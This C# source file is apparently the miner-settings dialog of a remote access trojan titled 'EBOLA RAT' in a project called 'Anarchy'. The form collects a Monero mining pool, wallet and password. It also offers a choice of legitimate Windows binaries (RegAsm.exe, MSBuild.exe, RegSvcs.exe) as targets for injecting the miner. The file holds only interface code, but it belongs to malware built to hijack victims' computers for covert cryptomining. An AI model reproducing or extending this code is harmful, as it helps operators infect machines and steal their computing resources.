using System;
using System.ComponentModel;
using System.Windows.Forms;
using Anarchy.Properties;
using ReaLTaiizor.Controls;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormMiner : Form
{
    private IContainer components;

    private Label label3;

    private Label label2;

    private Label label1;

    public TextBox txtPool;

    public TextBox txtWallet;

    public TextBox txtPass;

    private Label label4;

    public ComboBox comboInjection;

    private HopeForm hopeForm1;

    private HopeButton btnOK;

    public FormMiner()
    {
        this.InitializeComponent();
    }

    private void BtnOK_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrWhiteSpace(this.txtPool.Text) && !string.IsNullOrWhiteSpace(this.txtWallet.Text) && !string.IsNullOrWhiteSpace(this.txtPass.Text))
        {
            base.DialogResult = DialogResult.OK;
            Settings.Default.Save();
            base.Hide();
        }
    }

    private void FormMiner_Load(object sender, EventArgs e)
    {
        try
        {
            this.comboInjection.SelectedIndex = 0;
            this.txtPool.Text = Settings.Default.txtPool;
            this.txtWallet.Text = Settings.Default.txtWallet;
            this.txtPass.Text = Settings.Default.txtxmrPass;
        }
        catch
        {
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormMiner));
        this.label4 = new System.Windows.Forms.Label();
        this.comboInjection = new System.Windows.Forms.ComboBox();
        this.label3 = new System.Windows.Forms.Label();
        this.txtPass = new System.Windows.Forms.TextBox();
        this.label2 = new System.Windows.Forms.Label();
        this.txtWallet = new System.Windows.Forms.TextBox();
        this.label1 = new System.Windows.Forms.Label();
        this.txtPool = new System.Windows.Forms.TextBox();
        this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
        this.btnOK = new ReaLTaiizor.Controls.HopeButton();
        base.SuspendLayout();
        this.label4.AutoSize = true;
        this.label4.Location = new System.Drawing.Point(11, 143);
        this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(50, 13);
        this.label4.TabIndex = 6;
        this.label4.Text = "Injection:";
        this.comboInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.comboInjection.FormattingEnabled = true;
        this.comboInjection.Items.AddRange(new object[3] { "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe" });
        this.comboInjection.Location = new System.Drawing.Point(73, 141);
        this.comboInjection.Margin = new System.Windows.Forms.Padding(2);
        this.comboInjection.Name = "comboInjection";
        this.comboInjection.Size = new System.Drawing.Size(135, 21);
        this.comboInjection.TabIndex = 7;
        this.label3.AutoSize = true;
        this.label3.Location = new System.Drawing.Point(11, 112);
        this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(53, 13);
        this.label3.TabIndex = 5;
        this.label3.Text = "Password";
        this.txtPass.DataBindings.Add(new System.Windows.Forms.Binding("Text", Settings.Default, "txtxmrPass", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
        this.txtPass.Location = new System.Drawing.Point(73, 110);
        this.txtPass.Margin = new System.Windows.Forms.Padding(2);
        this.txtPass.Name = "txtPass";
        this.txtPass.Size = new System.Drawing.Size(416, 20);
        this.txtPass.TabIndex = 4;
        this.txtPass.Text = Settings.Default.txtxmrPass;
        this.label2.AutoSize = true;
        this.label2.Location = new System.Drawing.Point(11, 81);
        this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(37, 13);
        this.label2.TabIndex = 3;
        this.label2.Text = "Wallet";
        this.txtWallet.DataBindings.Add(new System.Windows.Forms.Binding("Text", Settings.Default, "txtWallet", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
        this.txtWallet.Location = new System.Drawing.Point(73, 79);
        this.txtWallet.Margin = new System.Windows.Forms.Padding(2);
        this.txtWallet.Name = "txtWallet";
        this.txtWallet.Size = new System.Drawing.Size(416, 20);
        this.txtWallet.TabIndex = 2;
        this.txtWallet.Text = Settings.Default.txtWallet;
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(11, 53);
        this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(50, 13);
        this.label1.TabIndex = 1;
        this.label1.Text = "Pool:Port";
        this.txtPool.DataBindings.Add(new System.Windows.Forms.Binding("Text", Settings.Default, "txtPool", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
        this.txtPool.Location = new System.Drawing.Point(73, 51);
        this.txtPool.Margin = new System.Windows.Forms.Padding(2);
        this.txtPool.Name = "txtPool";
        this.txtPool.Size = new System.Drawing.Size(416, 20);
        this.txtPool.TabIndex = 0;
        this.txtPool.Text = Settings.Default.txtPool;
        this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(228, 231, 237);
        this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(245, 108, 108);
        this.hopeForm1.ControlBoxColorN = System.Drawing.Color.Black;
        this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
        this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
        this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeForm1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.hopeForm1.Image = (System.Drawing.Image)resources.GetObject("hopeForm1.Image");
        this.hopeForm1.Location = new System.Drawing.Point(0, 0);
        this.hopeForm1.MaximizeBox = false;
        this.hopeForm1.Name = "hopeForm1";
        this.hopeForm1.Size = new System.Drawing.Size(497, 40);
        this.hopeForm1.TabIndex = 2;
        this.hopeForm1.Text = "XMR Miner | EBOLA RAT";
        this.hopeForm1.ThemeColor = System.Drawing.Color.White;
        this.btnOK.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.btnOK.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.btnOK.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnOK.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.btnOK.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.btnOK.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.btnOK.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.btnOK.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.btnOK.Location = new System.Drawing.Point(222, 135);
        this.btnOK.Name = "btnOK";
        this.btnOK.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.btnOK.Size = new System.Drawing.Size(263, 33);
        this.btnOK.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.btnOK.TabIndex = 42;
        this.btnOK.Text = "OK";
        this.btnOK.TextColor = System.Drawing.Color.White;
        this.btnOK.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.btnOK.Click += new System.EventHandler(BtnOK_Click);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.White;
        base.ClientSize = new System.Drawing.Size(497, 175);
        base.Controls.Add(this.btnOK);
        base.Controls.Add(this.label4);
        base.Controls.Add(this.hopeForm1);
        base.Controls.Add(this.comboInjection);
        base.Controls.Add(this.label3);
        base.Controls.Add(this.txtPass);
        base.Controls.Add(this.label1);
        base.Controls.Add(this.label2);
        base.Controls.Add(this.txtPool);
        base.Controls.Add(this.txtWallet);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormMiner";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "XMR Miner";
        base.Load += new System.EventHandler(FormMiner_Load);
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}